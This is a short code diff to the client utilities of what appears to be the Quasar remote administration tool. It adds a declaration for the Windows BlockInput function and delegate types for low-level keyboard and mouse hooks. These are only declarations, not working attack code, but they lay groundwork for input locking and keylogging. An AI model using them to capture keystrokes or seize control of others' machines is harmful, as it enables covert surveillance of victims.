@@ -102,6 +102,9 @@ namespace Quasar.Client.Utilities
         [DllImport("user32.dll")]
         public static extern IntPtr GetProcessWindowStation();
 
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern bool BlockInput(bool fBlockIt);
+
         [DllImport("user32.dll", SetLastError = true)]
         public static extern bool EnumDesktops(IntPtr hwinsta, EnumDesktopProc lpEnumFunc, IntPtr lParam);
         public delegate bool EnumDesktopProc(string lpszDesktop, IntPtr lParam);
@@ -243,6 +246,9 @@ namespace Quasar.Client.Utilities
 
         [DllImport("iphlpapi.dll")]
         internal static extern int SetTcpEntry(IntPtr pTcprow);
+
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        public delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         [StructLayout(LayoutKind.Sequential)]
         internal struct MibTcprowOwnerPid
